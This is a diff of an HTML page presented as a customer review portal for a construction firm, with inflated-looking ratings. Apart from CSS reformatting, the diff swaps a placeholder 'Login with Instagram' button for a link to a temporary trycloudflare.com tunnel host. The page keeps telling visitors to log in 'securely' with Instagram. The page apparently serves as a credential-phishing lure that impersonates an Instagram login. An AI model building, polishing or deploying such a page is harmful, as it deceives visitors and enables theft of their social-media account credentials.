@@ -3,214 +3,266 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Dilip Buildcon Infra Pvt. Ltd. | Reviews</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
 <style>
 *{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:'Poppins',sans-serif;
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Poppins',sans-serif;
 }
 
 body{
-background:linear-gradient(135deg,#0f172a,#1e293b);
-display:flex;
-justify-content:center;
-align-items:center;
-min-height:100vh;
-padding:20px;
+    background:linear-gradient(135deg,#0f172a,#1e293b);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    padding:20px;
 }
 
 .container{
-background:#fff;
-width:100%;
-max-width:520px;
-border-radius:22px;
-padding:35px;
-box-shadow:0 25px 60px rgba(0,0,0,.35);
-text-align:center;
+    background:#fff;
+    width:100%;
+    max-width:520px;
+    border-radius:22px;
+    padding:35px;
+    box-shadow:0 25px 60px rgba(0,0,0,.35);
+    text-align:center;
 }
 
 .logo{
-width:90px;
-height:90px;
-margin:auto;
-border-radius:50%;
-background:#0f172a;
-display:flex;
-justify-content:center;
-align-items:center;
-color:#fff;
-font-size:34px;
-font-weight:700;
-margin-bottom:20px;
+    width:90px;
+    height:90px;
+    margin:0 auto 20px;
+    border-radius:50%;
+    background:#0f172a;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    color:#fff;
+    font-size:34px;
+    font-weight:700;
 }
 
 h1{
-font-size:28px;
-color:#111827;
-margin-bottom:8px;
+    font-size:28px;
+    color:#111827;
+    margin-bottom:8px;
 }
 
 .subtitle{
-color:#64748b;
-margin-bottom:28px;
-font-size:15px;
+    color:#64748b;
+    margin-bottom:28px;
+    font-size:15px;
 }
 
 .rating{
-display:flex;
-justify-content:center;
-gap:6px;
-font-size:30px;
-margin-bottom:18px;
+    display:flex;
+    justify-content:center;
+    gap:6px;
+    font-size:30px;
+    margin-bottom:18px;
 }
 
 .rating span{
-color:#f59e0b;
+    color:#f59e0b;
 }
 
 .score{
-font-size:38px;
-font-weight:700;
-color:#111827;
-margin-bottom:6px;
+    font-size:38px;
+    font-weight:700;
+    color:#111827;
+    margin-bottom:6px;
 }
 
 .review-text{
-color:#64748b;
-margin-bottom:28px;
+    color:#64748b;
+    margin-bottom:28px;
 }
 
 .stats{
-display:grid;
-grid-template-columns:repeat(3,1fr);
-gap:12px;
-margin-bottom:30px;
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:12px;
+    margin-bottom:30px;
 }
 
 .stat{
-background:#f8fafc;
-padding:16px;
-border-radius:14px;
+    background:#f8fafc;
+    padding:16px;
+    border-radius:14px;
 }
 
 .stat h3{
-color:#0f172a;
-font-size:20px;
-margin-bottom:4px;
+    color:#0f172a;
+    font-size:20px;
+    margin-bottom:4px;
 }
 
 .stat p{
-font-size:13px;
-color:#64748b;
+    font-size:13px;
+    color:#64748b;
 }
 
+/* Instagram Login Button */
 .instagram-btn{
-width:100%;
-border:none;
-padding:16px;
-border-radius:14px;
-cursor:pointer;
-font-size:16px;
-font-weight:600;
-color:white;
-background:linear-gradient(45deg,#f58529,#feda77,#dd2a7b,#8134af,#515bd4);
-transition:.3s;
+    display:block;
+    width:100%;
+    padding:16px;
+    border-radius:14px;
+    cursor:pointer;
+    font-size:16px;
+    font-weight:600;
+    color:#fff;
+    text-decoration:none;
+    text-align:center;
+
+    background:linear-gradient(
+        45deg,
+        #f58529,
+        #feda77,
+        #dd2a7b,
+        #8134af,
+        #515bd4
+    );
+
+    transition:0.3s ease;
 }
 
 .instagram-btn:hover{
-transform:translateY(-3px);
-box-shadow:0 12px 25px rgba(221,42,123,.35);
+    transform:translateY(-3px);
+    box-shadow:0 12px 25px rgba(221,42,123,.35);
+}
+
+.instagram-btn:active{
+    transform:scale(.98);
 }
 
 .note{
-margin-top:18px;
-font-size:12px;
-color:#94a3b8;
-line-height:1.6;
+    margin-top:18px;
+    font-size:12px;
+    color:#94a3b8;
+    line-height:1.6;
 }
 
 .footer{
-margin-top:25px;
-padding-top:20px;
-border-top:1px solid #e5e7eb;
-font-size:12px;
-color:#64748b;
+    margin-top:25px;
+    padding-top:20px;
+    border-top:1px solid #e5e7eb;
+    font-size:12px;
+    color:#64748b;
 }
 
 @media(max-width:480px){
-.container{
-padding:25px;
-}
-h1{
-font-size:24px;
-}
-.score{
-font-size:34px;
-}
+
+    body{
+        padding:15px;
+    }
+
+    .container{
+        padding:25px 20px;
+    }
+
+    h1{
+        font-size:24px;
+    }
+
+    .score{
+        font-size:34px;
+    }
+
+    .rating{
+        font-size:27px;
+    }
+
+    .stats{
+        gap:8px;
+    }
+
+    .stat{
+        padding:13px 8px;
+    }
+
+    .stat h3{
+        font-size:18px;
+    }
+
+    .stat p{
+        font-size:11px;
+    }
 }
 </style>
 </head>
+
 <body>
 
 <div class="container">
 
-<div class="logo">DB</div>
+    <div class="logo">DB</div>
 
-<h1>Dilip Buildcon Infra Pvt. Ltd.</h1>
-<p class="subtitle">Professional Review & Customer Feedback Portal</p>
+    <h1>Dilip Buildcon Infra Pvt. Ltd.</h1>
 
-<div class="rating">
-<span>★</span>
-<span>★</span>
-<span>★</span>
-<span>★</span>
-<span>★</span>
+    <p class="subtitle">
+        Professional Review & Customer Feedback Portal
+    </p>
+
+    <div class="rating">
+        <span>★</span>
+        <span>★</span>
+        <span>★</span>
+        <span>★</span>
+        <span>★</span>
+    </div>
+
+    <div class="score">4.9/5</div>
+
+    <p class="review-text">
+        Trusted infrastructure and construction services appreciated by
+        customers and partners.
+    </p>
+
+    <div class="stats">
+
+        <div class="stat">
+            <h3>4.9</h3>
+            <p>Average Rating</p>
+        </div>
+
+        <div class="stat">
+            <h3>12K+</h3>
+            <p>Reviews</p>
+        </div>
+
+        <div class="stat">
+            <h3>98%</h3>
+            <p>Satisfaction</p>
+        </div>
+
+    </div>
+
+    <!-- Instagram Login -->
+    <a
+        href="https://harder-improved-planets-weather.trycloudflare.com"
+        class="instagram-btn"
+    >
+        📸 Login with Instagram
+    </a>
+
+    <p class="note">
+        Login securely with your Instagram account to submit and manage
+        your review.
+    </p>
+
+    <div class="footer">
+        © 2026 Dilip Buildcon Infra Pvt. Ltd. • Review Portal
+    </div>
+
 </div>
-
-<div class="score">4.9/5</div>
-<p class="review-text">Trusted infrastructure and construction services appreciated by customers and partners.</p>
-
-<div class="stats">
-<div class="stat">
-<h3>4.9</h3>
-<p>Average Rating</p>
-</div>
-
-<div class="stat">
-<h3>12K+</h3>
-<p>Reviews</p>
-</div>
-
-<div class="stat">
-<h3>98%</h3>
-<p>Satisfaction</p>
-</div>
-</div>
-
-<button class="instagram-btn" onclick="instagramLogin()">
-📸 Login with Instagram
-</button>
-
-<p class="note">
-Login securely with your Instagram account to submit and manage your review.
-</p>
-
-<div class="footer">
-© 2026 Dilip Buildcon Infra Pvt. Ltd. • Review Portal
-</div>
-
-</div>
-
-<script>
-function instagramLogin(){
-alert("Instagram Login integration can be connected with Meta OAuth.");
-}
-</script>
 
 </body>
 </html>
